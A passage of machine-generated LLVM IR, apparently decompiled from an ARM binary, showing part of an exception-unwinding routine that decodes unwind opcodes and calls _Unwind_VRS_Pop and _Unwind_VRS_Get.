dec_label_pc_1a37c:                               ; preds = %.thread30.dec_label_pc_1a37c_crit_edge, %dec_label_pc_1a368
  %v2_1a394 = phi i32 [ %v0_1a37c.pre, %.thread30.dec_label_pc_1a37c_crit_edge ], [ %v0_1a368, %dec_label_pc_1a368 ]
  %v1_1a37c = add i32 %v2_1a394, 9
  %v2_1a37c = inttoptr i32 %v1_1a37c to i8*
  %v3_1a37c = load i8, i8* %v2_1a37c, align 1
  %v4_1a37c = zext i8 %v3_1a37c to i32
  store i32 %v4_1a37c, i32* %r3.global-to-local, align 4
  %v2_1a380 = icmp eq i8 %v3_1a37c, 0
  store i1 %v2_1a380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a380, label %dec_label_pc_1a3cc, label %dec_label_pc_1a390

dec_label_pc_1a390:                               ; preds = %dec_label_pc_1a37c
  %v1_1a390 = add nsw i32 %v4_1a37c, -1
  store i32 %v1_1a390, i32* %r3.global-to-local, align 4
  %v1_1a394 = trunc i32 %v1_1a390 to i8
  store i8 %v1_1a394, i8* %v2_1a37c, align 1
  %v0_1a398 = load i32, i32* @r5, align 4
  %v1_1a398 = add i32 %v0_1a398, 4
  %v2_1a398 = inttoptr i32 %v1_1a398 to i32*
  %v3_1a398 = load i32, i32* %v2_1a398, align 4
  store i32 %v3_1a398, i32* %r2.global-to-local, align 4
  %v1_1a39c = inttoptr i32 %v3_1a398 to i32*
  %v2_1a39c = load i32, i32* %v1_1a39c, align 4
  store i32 %v2_1a39c, i32* %r0.global-to-local, align 4
  %v4_1a39c = add i32 %v3_1a398, 4
  store i32 %v4_1a39c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a39c, i32* %v2_1a398, align 4
  %v0_1a3a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a3a8 = trunc i32 %v0_1a3a8 to i8
  %v2_1a3a8 = load i32, i32* @r5, align 4
  %v3_1a3a8 = add i32 %v2_1a3a8, 8
  %v4_1a3a8 = inttoptr i32 %v3_1a3a8 to i8*
  store i8 %v1_1a3a8, i8* %v4_1a3a8, align 1
  %v0_1a3ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1a3ac = load i32, i32* @r5, align 4
  %v2_1a3ac = inttoptr i32 %v1_1a3ac to i32*
  store i32 %v0_1a3ac, i32* %v2_1a3ac, align 4
  br label %dec_label_pc_1a3b0

dec_label_pc_1a3b0:                               ; preds = %.thread30, %dec_label_pc_1a390
  %v0_1a3b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a3b0 = udiv i32 %v0_1a3b0, 16777216
  %v1_1a3b4 = urem i32 %v3_1a3b0, 16
  %v3_1a3b8 = mul i32 %v0_1a3b0, 256
  store i32 %v3_1a3b8, i32* %r0.global-to-local, align 4
  %v1_1a3bc = add nuw nsw i32 %v1_1a3b4, 1
  store i32 %v1_1a3bc, i32* %r2.global-to-local, align 4
  %v1_1a3c0 = and i32 %v3_1a3b0, 240
  store i32 %v1_1a3c0, i32* %r3.global-to-local, align 4
  %v1_1a3c4 = load i32, i32* @r5, align 4
  %v2_1a3c4 = inttoptr i32 %v1_1a3c4 to i32*
  store i32 %v3_1a3b8, i32* %v2_1a3c4, align 4
  %v0_1a3c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a3c8 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a3c8 = mul i32 %v1_1a3c8, 4096
  %v5_1a3c8 = or i32 %v4_1a3c8, %v0_1a3c8
  br label %dec_label_pc_1a3cc

dec_label_pc_1a3cc:                               ; preds = %dec_label_pc_1a37c, %dec_label_pc_1a3b0
  %storemerge132 = phi i32 [ %v5_1a3c8, %dec_label_pc_1a3b0 ], [ 720897, %dec_label_pc_1a37c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ec

dec_label_pc_1a3d4:                               ; preds = %dec_label_pc_1a360
  %v1_1a3d4 = and i32 %v0_1a044, 252
  store i32 %v1_1a3d4, i32* %r3.global-to-local, align 4
  %v7_1a3d8 = icmp eq i32 %v1_1a3d4, 180
  store i1 %v7_1a3d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3d8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1a3d4
  %v2_1a3dc = urem i32 %v0_1a044, 4
  %v2_1a3e4 = add nuw nsw i32 %v2_1a3dc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1a3f0 = or i32 %v2_1a3e4, 262144
  store i32 %v2_1a3f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ec

bb157:                                            ; preds = %dec_label_pc_1a3d4
  %v2_1a3e0 = urem i32 %v0_1a350, 8
  %v2_1a3e8 = add nuw nsw i32 %v2_1a3e0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1a3f8 = or i32 %v2_1a3e8, 524288
  store i32 %v2_1a3f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ec

dec_label_pc_1a400:                               ; preds = %dec_label_pc_1a310
  %v0_1a400 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a400 = icmp eq i32 %v0_1a400, 198
  store i1 %v7_1a400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a400, label %dec_label_pc_1a408, label %dec_label_pc_1a20c

dec_label_pc_1a408:                               ; preds = %dec_label_pc_1a400
  %v0_1a408 = load i32, i32* @r5, align 4
  %v1_1a408 = add i32 %v0_1a408, 8
  %v2_1a408 = inttoptr i32 %v1_1a408 to i8*
  %v3_1a408 = load i8, i8* %v2_1a408, align 1
  %v4_1a408 = zext i8 %v3_1a408 to i32
  store i32 %v4_1a408, i32* %r3.global-to-local, align 4
  %v2_1a40c = icmp eq i8 %v3_1a408, 0
  store i1 %v2_1a40c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a40c, label %dec_label_pc_1a41c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1a408
  %v2_1a410 = add nsw i32 %v4_1a408, -1
  store i32 %v2_1a410, i32* %r3.global-to-local, align 4
  %v2_1a414 = trunc i32 %v2_1a410 to i8
  store i8 %v2_1a414, i8* %v2_1a408, align 1
  %v0_1a418.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a418.pr.pr, label %.thread48.dec_label_pc_1a41c_crit_edge, label %dec_label_pc_1a450

.thread48.dec_label_pc_1a41c_crit_edge:           ; preds = %.thread48
  %v0_1a41c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a41c

dec_label_pc_1a41c:                               ; preds = %.thread48.dec_label_pc_1a41c_crit_edge, %dec_label_pc_1a408
  %v2_1a434 = phi i32 [ %v0_1a41c.pre, %.thread48.dec_label_pc_1a41c_crit_edge ], [ %v0_1a408, %dec_label_pc_1a408 ]
  %v1_1a41c = add i32 %v2_1a434, 9
  %v2_1a41c = inttoptr i32 %v1_1a41c to i8*
  %v3_1a41c = load i8, i8* %v2_1a41c, align 1
  %v4_1a41c = zext i8 %v3_1a41c to i32
  store i32 %v4_1a41c, i32* %r3.global-to-local, align 4
  %v2_1a420 = icmp eq i8 %v3_1a41c, 0
  store i1 %v2_1a420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a420, label %dec_label_pc_1a46c, label %dec_label_pc_1a430

dec_label_pc_1a430:                               ; preds = %dec_label_pc_1a41c
  %v1_1a430 = add nsw i32 %v4_1a41c, -1
  store i32 %v1_1a430, i32* %r3.global-to-local, align 4
  %v1_1a434 = trunc i32 %v1_1a430 to i8
  store i8 %v1_1a434, i8* %v2_1a41c, align 1
  %v0_1a438 = load i32, i32* @r5, align 4
  %v1_1a438 = add i32 %v0_1a438, 4
  %v2_1a438 = inttoptr i32 %v1_1a438 to i32*
  %v3_1a438 = load i32, i32* %v2_1a438, align 4
  store i32 %v3_1a438, i32* %r2.global-to-local, align 4
  %v1_1a43c = inttoptr i32 %v3_1a438 to i32*
  %v2_1a43c = load i32, i32* %v1_1a43c, align 4
  store i32 %v2_1a43c, i32* %r0.global-to-local, align 4
  %v4_1a43c = add i32 %v3_1a438, 4
  store i32 %v4_1a43c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a43c, i32* %v2_1a438, align 4
  %v0_1a448 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a448 = trunc i32 %v0_1a448 to i8
  %v2_1a448 = load i32, i32* @r5, align 4
  %v3_1a448 = add i32 %v2_1a448, 8
  %v4_1a448 = inttoptr i32 %v3_1a448 to i8*
  store i8 %v1_1a448, i8* %v4_1a448, align 1
  %v0_1a44c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a44c = load i32, i32* @r5, align 4
  %v2_1a44c = inttoptr i32 %v1_1a44c to i32*
  store i32 %v0_1a44c, i32* %v2_1a44c, align 4
  br label %dec_label_pc_1a450

dec_label_pc_1a450:                               ; preds = %.thread48, %dec_label_pc_1a430
  %v0_1a450 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a450 = udiv i32 %v0_1a450, 16777216
  %v1_1a454 = urem i32 %v3_1a450, 16
  %v3_1a458 = mul i32 %v0_1a450, 256
  store i32 %v3_1a458, i32* %r0.global-to-local, align 4
  %v1_1a45c = add nuw nsw i32 %v1_1a454, 1
  store i32 %v1_1a45c, i32* %r2.global-to-local, align 4
  %v1_1a460 = and i32 %v3_1a450, 240
  store i32 %v1_1a460, i32* %r3.global-to-local, align 4
  %v1_1a464 = load i32, i32* @r5, align 4
  %v2_1a464 = inttoptr i32 %v1_1a464 to i32*
  store i32 %v3_1a458, i32* %v2_1a464, align 4
  %v0_1a468 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a468 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a468 = mul i32 %v1_1a468, 4096
  %v5_1a468 = or i32 %v4_1a468, %v0_1a468
  br label %dec_label_pc_1a46c

dec_label_pc_1a46c:                               ; preds = %dec_label_pc_1a41c, %dec_label_pc_1a450
  %storemerge131 = phi i32 [ %v5_1a468, %dec_label_pc_1a450 ], [ 720897, %dec_label_pc_1a41c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ec

dec_label_pc_1a474:                               ; preds = %dec_label_pc_1a230
  %v0_1a474 = load i32, i32* @r5, align 4
  %v1_1a474 = add i32 %v0_1a474, 8
  %v2_1a474 = inttoptr i32 %v1_1a474 to i8*
  %v3_1a474 = load i8, i8* %v2_1a474, align 1
  %v4_1a474 = zext i8 %v3_1a474 to i32
  store i32 %v4_1a474, i32* %r3.global-to-local, align 4
  %v2_1a478 = icmp eq i8 %v3_1a474, 0
  store i1 %v2_1a478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a478, label %dec_label_pc_1a488, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1a474
  %v2_1a47c = add nsw i32 %v4_1a474, -1
  store i32 %v2_1a47c, i32* %r3.global-to-local, align 4
  %v2_1a480 = trunc i32 %v2_1a47c to i8
  store i8 %v2_1a480, i8* %v2_1a474, align 1
  %v0_1a484.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a484.pr.pr, label %.thread52.dec_label_pc_1a488_crit_edge, label %dec_label_pc_1a4bc

.thread52.dec_label_pc_1a488_crit_edge:           ; preds = %.thread52
  %v0_1a488.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a488

dec_label_pc_1a488:                               ; preds = %.thread52.dec_label_pc_1a488_crit_edge, %dec_label_pc_1a474
  %v2_1a4a0 = phi i32 [ %v0_1a488.pre, %.thread52.dec_label_pc_1a488_crit_edge ], [ %v0_1a474, %dec_label_pc_1a474 ]
  %v1_1a488 = add i32 %v2_1a4a0, 9
  %v2_1a488 = inttoptr i32 %v1_1a488 to i8*
  %v3_1a488 = load i8, i8* %v2_1a488, align 1
  %v4_1a488 = zext i8 %v3_1a488 to i32
  store i32 %v4_1a488, i32* %r3.global-to-local, align 4
  %v2_1a48c = icmp eq i8 %v3_1a488, 0
  store i1 %v2_1a48c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a48c, label %dec_label_pc_1a4d8, label %dec_label_pc_1a49c

dec_label_pc_1a49c:                               ; preds = %dec_label_pc_1a488
  %v1_1a49c = add nsw i32 %v4_1a488, -1
  store i32 %v1_1a49c, i32* %r3.global-to-local, align 4
  %v1_1a4a0 = trunc i32 %v1_1a49c to i8
  store i8 %v1_1a4a0, i8* %v2_1a488, align 1
  %v0_1a4a4 = load i32, i32* @r5, align 4
  %v1_1a4a4 = add i32 %v0_1a4a4, 4
  %v2_1a4a4 = inttoptr i32 %v1_1a4a4 to i32*
  %v3_1a4a4 = load i32, i32* %v2_1a4a4, align 4
  store i32 %v3_1a4a4, i32* %r2.global-to-local, align 4
  %v1_1a4a8 = inttoptr i32 %v3_1a4a4 to i32*
  %v2_1a4a8 = load i32, i32* %v1_1a4a8, align 4
  store i32 %v2_1a4a8, i32* %r0.global-to-local, align 4
  %v4_1a4a8 = add i32 %v3_1a4a4, 4
  store i32 %v4_1a4a8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a4a8, i32* %v2_1a4a4, align 4
  %v0_1a4b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4b4 = trunc i32 %v0_1a4b4 to i8
  %v2_1a4b4 = load i32, i32* @r5, align 4
  %v3_1a4b4 = add i32 %v2_1a4b4, 8
  %v4_1a4b4 = inttoptr i32 %v3_1a4b4 to i8*
  store i8 %v1_1a4b4, i8* %v4_1a4b4, align 1
  %v0_1a4b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a4b8 = load i32, i32* @r5, align 4
  %v2_1a4b8 = inttoptr i32 %v1_1a4b8 to i32*
  store i32 %v0_1a4b8, i32* %v2_1a4b8, align 4
  br label %dec_label_pc_1a4bc

dec_label_pc_1a4bc:                               ; preds = %.thread52, %dec_label_pc_1a49c
  %v0_1a4bc = load i32, i32* %r0.global-to-local, align 4
  %v3_1a4bc = udiv i32 %v0_1a4bc, 16777216
  %v1_1a4c0 = urem i32 %v3_1a4bc, 16
  %v3_1a4c4 = mul i32 %v0_1a4bc, 256
  store i32 %v3_1a4c4, i32* %r0.global-to-local, align 4
  %v1_1a4c8 = add nuw nsw i32 %v1_1a4c0, 1
  store i32 %v1_1a4c8, i32* %r2.global-to-local, align 4
  %v1_1a4cc = and i32 %v3_1a4bc, 240
  store i32 %v1_1a4cc, i32* %r3.global-to-local, align 4
  %v1_1a4d0 = load i32, i32* @r5, align 4
  %v2_1a4d0 = inttoptr i32 %v1_1a4d0 to i32*
  store i32 %v3_1a4c4, i32* %v2_1a4d0, align 4
  %v0_1a4d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4d4 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a4d4 = mul i32 %v1_1a4d4, 4096
  %v5_1a4d4 = or i32 %v4_1a4d4, %v0_1a4d4
  br label %dec_label_pc_1a4d8

dec_label_pc_1a4d8:                               ; preds = %dec_label_pc_1a488, %dec_label_pc_1a4bc
  %storemerge130 = phi i32 [ %v5_1a4d4, %dec_label_pc_1a4bc ], [ 720897, %dec_label_pc_1a488 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ec

dec_label_pc_1a4e0:                               ; preds = %dec_label_pc_1a20c
  %v0_1a4e0 = load i32, i32* @r5, align 4
  %v1_1a4e0 = add i32 %v0_1a4e0, 8
  %v2_1a4e0 = inttoptr i32 %v1_1a4e0 to i8*
  %v3_1a4e0 = load i8, i8* %v2_1a4e0, align 1
  %v4_1a4e0 = zext i8 %v3_1a4e0 to i32
  store i32 %v4_1a4e0, i32* %r3.global-to-local, align 4
  %v2_1a4e4 = icmp eq i8 %v3_1a4e0, 0
  store i1 %v2_1a4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4e4, label %dec_label_pc_1a68c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1a4e0
  %v2_1a4e8 = add nsw i32 %v4_1a4e0, -1
  store i32 %v2_1a4e8, i32* %r3.global-to-local, align 4
  %v2_1a4ec = trunc i32 %v2_1a4e8 to i8
  store i8 %v2_1a4ec, i8* %v2_1a4e0, align 1
  %v0_1a4f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a4f0.pr.pr, label %.thread56.dec_label_pc_1a68c_crit_edge, label %dec_label_pc_1a4f4

.thread56.dec_label_pc_1a68c_crit_edge:           ; preds = %.thread56
  %v0_1a68c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a68c

dec_label_pc_1a4f4:                               ; preds = %.thread56, %dec_label_pc_1a698
  %v0_1a4f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a4f4 = udiv i32 %v0_1a4f4, 16777216
  store i32 %v3_1a4f4, i32* %r3.global-to-local, align 4
  store i32 %v3_1a4f4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1a4f4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1a4fc = mul i32 %v0_1a4f4, 256
  store i32 %v3_1a4fc, i32* %r0.global-to-local, align 4
  %v1_1a500 = load i32, i32* @r5, align 4
  %v2_1a500 = inttoptr i32 %v1_1a500 to i32*
  store i32 %v3_1a4fc, i32* %v2_1a500, align 4
  br i1 %tmp184, label %dec_label_pc_1a2bc, label %dec_label_pc_1a508

dec_label_pc_1a508:                               ; preds = %dec_label_pc_1a4f4
  %v0_1a508 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a508 = and i32 %v0_1a508, 240
  store i32 %v1_1a508, i32* %r3.global-to-local, align 4
  %v2_1a508 = icmp eq i32 %v1_1a508, 0
  store i1 %v2_1a508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a508, label %dec_label_pc_1a510, label %dec_label_pc_1a2bc

dec_label_pc_1a510:                               ; preds = %dec_label_pc_1a508
  %v0_1a510 = load i32, i32* @r7, align 4
  store i32 %v0_1a510, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1a518 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a518 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a510, i32 4, i32 %v2_1a518, i32 0)
  store i32 %v4_1a518, i32* %r0.global-to-local, align 4
  %v2_1a51c = icmp eq i32 %v4_1a518, 0
  store i1 %v2_1a51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a51c, label %dec_label_pc_19fec.backedge, label %dec_label_pc_1a524

dec_label_pc_1a524:                               ; preds = %dec_label_pc_1a510
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a52c:                               ; preds = %dec_label_pc_1a358
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a538 = load i32, i32* @r7, align 4
  store i32 %v0_1a538, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1a544 = call i32 @_Unwind_VRS_Get(i32 %v0_1a538, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a544, i32* %r0.global-to-local, align 4
  %v0_1a548 = load i32, i32* @r5, align 4
  %v1_1a548 = add i32 %v0_1a548, 8
  %v2_1a548 = inttoptr i32 %v1_1a548 to i8*
  %v3_1a548 = load i8, i8* %v2_1a548, align 1
  %v4_1a548 = zext i8 %v3_1a548 to i32
  store i32 %v4_1a548, i32* %r1.global-to-local, align 4
  %v2_1a54c = icmp eq i8 %v3_1a548, 0
  store i1 %v2_1a54c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a54c, label %dec_label_pc_1a55c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1a52c
  %v2_1a550 = add nsw i32 %v4_1a548, -1
  store i32 %v2_1a550, i32* %r3.global-to-local, align 4
  %v2_1a554 = trunc i32 %v2_1a550 to i8
  store i8 %v2_1a554, i8* %v2_1a548, align 1
  %v0_1a558.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a558.pr.pr, label %.thread58.dec_label_pc_1a55c_crit_edge, label %dec_label_pc_1a588

.thread58.dec_label_pc_1a55c_crit_edge:           ; preds = %.thread58
  %v0_1a55c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a55c

dec_label_pc_1a55c:                               ; preds = %.thread58.dec_label_pc_1a55c_crit_edge, %dec_label_pc_1a52c
  %v2_1a570 = phi i32 [ %v0_1a55c.pre, %.thread58.dec_label_pc_1a55c_crit_edge ], [ %v0_1a548, %dec_label_pc_1a52c ]
  %v1_1a55c = add i32 %v2_1a570, 9
  %v2_1a55c = inttoptr i32 %v1_1a55c to i8*
  %v3_1a55c = load i8, i8* %v2_1a55c, align 1
  %v4_1a55c = zext i8 %v3_1a55c to i32
  store i32 %v4_1a55c, i32* %r3.global-to-local, align 4
  %v2_1a560 = icmp eq i8 %v3_1a55c, 0
  store i1 %v2_1a560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a560, label %bb158, label %dec_label_pc_1a56c

bb158:                                            ; preds = %dec_label_pc_1a55c
  %v1_1a564 = load i32, i32* @r6, align 4
  store i32 %v1_1a564, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a5b0

dec_label_pc_1a56c:                               ; preds = %dec_label_pc_1a55c
  %v1_1a56c = add nsw i32 %v4_1a55c, -1
  store i32 %v1_1a56c, i32* %r3.global-to-local, align 4
  %v1_1a570 = trunc i32 %v1_1a56c to i8
  store i8 %v1_1a570, i8* %v2_1a55c, align 1
  %v0_1a574 = load i32, i32* @r5, align 4
  %v1_1a574 = add i32 %v0_1a574, 4
  %v2_1a574 = inttoptr i32 %v1_1a574 to i32*
  %v3_1a574 = load i32, i32* %v2_1a574, align 4
  store i32 %v3_1a574, i32* %r2.global-to-local, align 4
  %v1_1a578 = inttoptr i32 %v3_1a574 to i32*
  %v2_1a578 = load i32, i32* %v1_1a578, align 4
  store i32 %v2_1a578, i32* %r0.global-to-local, align 4
  %v4_1a578 = add i32 %v3_1a574, 4
  store i32 %v4_1a578, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1a580 = inttoptr i32 %v0_1a574 to i32*
  store i32 %v2_1a578, i32* %v1_1a580, align 4
  %v5_1a580 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a580, i32* %v2_1a574, align 4
  %v0_1a584 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a584 = trunc i32 %v0_1a584 to i8
  %v2_1a584 = load i32, i32* @r5, align 4
  %v3_1a584 = add i32 %v2_1a584, 8
  %v4_1a584 = inttoptr i32 %v3_1a584 to i8*
  store i8 %v1_1a584, i8* %v4_1a584, align 1
  br label %dec_label_pc_1a588

dec_label_pc_1a588:                               ; preds = %.thread58, %dec_label_pc_1a56c
  %v0_1a588 = load i32, i32* @r5, align 4
  %v1_1a588 = inttoptr i32 %v0_1a588 to i32*
  %v2_1a588 = load i32, i32* %v1_1a588, align 4
  store i32 %v2_1a588, i32* %r3.global-to-local, align 4
  %v3_1a58c = mul i32 %v2_1a588, 256
  store i32 %v3_1a58c, i32* %r0.global-to-local, align 4
  %v3_1a590 = udiv i32 %v2_1a588, 16777216
  store i32 %v3_1a590, i32* %r2.global-to-local, align 4
  store i32 %v3_1a58c, i32* %v1_1a588, align 4
  %v0_1a598 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a598 = and i32 %v0_1a598, 128
  %v2_1a598 = icmp eq i32 %v1_1a598, 0
  store i1 %v2_1a598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a598, label %.thread129, label %dec_label_pc_1a5ac

.thread129:                                       ; preds = %dec_label_pc_1a588
  %v4_1a59c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1a59c, i32* %ip.global-to-local, align 4
  %v1_1a5a0 = urem i32 %v0_1a598, 256
  store i32 %v1_1a5a0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1a620

dec_label_pc_1a5ac:                               ; preds = %dec_label_pc_1a588
  %v1_1a5a063 = urem i32 %v0_1a598, 256
  store i32 %v1_1a5a063, i32* %r2.global-to-local, align 4
  %v0_1a5ac = load i32, i32* @r5, align 4
  %v1_1a5ac = add i32 %v0_1a5ac, 8
  %v2_1a5ac = inttoptr i32 %v1_1a5ac to i8*
  %v3_1a5ac = load i8, i8* %v2_1a5ac, align 1
  %v4_1a5ac = zext i8 %v3_1a5ac to i32
  store i32 %v4_1a5ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a5b0

dec_label_pc_1a5b0:                               ; preds = %bb158, %dec_label_pc_1a5ac
  %v3_1a5d099 = phi i32 [ %v2_1a570, %bb158 ], [ %v0_1a5ac, %dec_label_pc_1a5ac ]
  %v0_1a5b892 = phi i32 [ %v1_1a564, %bb158 ], [ %v1_1a5a063, %dec_label_pc_1a5ac ]
  %v3_1a5b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1a5b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a5b8

dec_label_pc_1a5b8:                               ; preds = %dec_label_pc_1a5b8.backedge, %dec_label_pc_1a5b0
  %v3_1a5d0 = phi i32 [ %v3_1a5d0100, %dec_label_pc_1a5b8.backedge ], [ %v3_1a5d099, %dec_label_pc_1a5b0 ]
  %v0_1a5cc = phi i32 [ %v2_1a5bc.pre, %dec_label_pc_1a5b8.backedge ], [ 2, %dec_label_pc_1a5b0 ]
  %v0_1a5bc = phi i32 [ %v0_1a5bc.pre, %dec_label_pc_1a5b8.backedge ], [ %v3_1a5b0, %dec_label_pc_1a5b0 ]
  %v0_1a5b8 = phi i32 [ %v0_1a5b895, %dec_label_pc_1a5b8.backedge ], [ %v0_1a5b892, %dec_label_pc_1a5b0 ]
  %v1_1a5b8 = urem i32 %v0_1a5b8, 128
  %v7_1a5bc = shl i32 %v1_1a5b8, %v0_1a5cc
  %v8_1a5bc = add i32 %v7_1a5bc, %v0_1a5bc
  store i32 %v8_1a5bc, i32* %ip.global-to-local, align 4
  %v0_1a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a5c0 = icmp eq i32 %v0_1a5c0, 0
  store i1 %v2_1a5c0, i1* %cpsr_z.global-to-local, align 1
  %v1_1a5c4 = add i32 %v0_1a5c0, -1
  store i32 %v1_1a5c4, i32* %r3.global-to-local, align 4
  store i32 %v8_1a5bc, i32* %stack_var_-36, align 4
  %v1_1a5cc = add i32 %v0_1a5cc, 7
  store i32 %v1_1a5cc, i32* @lr, align 4
  br i1 %v2_1a5c0, label %dec_label_pc_1a5d8, label %bb159

bb159:                                            ; preds = %dec_label_pc_1a5b8
  %v2_1a5d0 = trunc i32 %v1_1a5c4 to i8
  %v4_1a5d0 = add i32 %v3_1a5d0, 8
  %v5_1a5d0 = inttoptr i32 %v4_1a5d0 to i8*
  store i8 %v2_1a5d0, i8* %v5_1a5d0, align 1
  %v0_1a5d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a5d4.pr, label %.dec_label_pc_1a5d8_crit_edge, label %dec_label_pc_1a604

.dec_label_pc_1a5d8_crit_edge:                    ; preds = %bb159
  %v0_1a5d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a5d8

dec_label_pc_1a5d8:                               ; preds = %.dec_label_pc_1a5d8_crit_edge, %dec_label_pc_1a5b8
  %v2_1a5f0 = phi i32 [ %v0_1a5d8.pre, %.dec_label_pc_1a5d8_crit_edge ], [ %v3_1a5d0, %dec_label_pc_1a5b8 ]
  %v1_1a5d8 = add i32 %v2_1a5f0, 9
  %v2_1a5d8 = inttoptr i32 %v1_1a5d8 to i8*
  %v3_1a5d8 = load i8, i8* %v2_1a5d8, align 1
  %v4_1a5d8 = zext i8 %v3_1a5d8 to i32
  store i32 %v4_1a5d8, i32* %r3.global-to-local, align 4
  %v2_1a5dc = icmp eq i8 %v3_1a5d8, 0
  store i1 %v2_1a5dc, i1* %cpsr_z.global-to-local, align 1
  %v1_1a5e0 = add nsw i32 %v4_1a5d8, -1
  store i32 %v1_1a5e0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1a5dc, label %dec_label_pc_1a5b8.backedge, label %dec_label_pc_1a5ec

dec_label_pc_1a5ec:                               ; preds = %dec_label_pc_1a5d8
  %v1_1a5ec = add i32 %v2_1a5f0, 4
  %v2_1a5ec = inttoptr i32 %v1_1a5ec to i32*
  %v3_1a5ec = load i32, i32* %v2_1a5ec, align 4
  store i32 %v3_1a5ec, i32* %r2.global-to-local, align 4
  %v1_1a5f0 = trunc i32 %v1_1a5e0 to i8
  store i8 %v1_1a5f0, i8* %v2_1a5d8, align 1
  %v0_1a5f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5f4 = inttoptr i32 %v0_1a5f4 to i32*
  %v2_1a5f4 = load i32, i32* %v1_1a5f4, align 4
  store i32 %v2_1a5f4, i32* %r0.global-to-local, align 4
  %v4_1a5f4 = add i32 %v0_1a5f4, 4
  store i32 %v4_1a5f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1a5fc = load i32, i32* @r5, align 4
  %v3_1a5fc = add i32 %v2_1a5fc, 8
  %v4_1a5fc = inttoptr i32 %v3_1a5fc to i8*
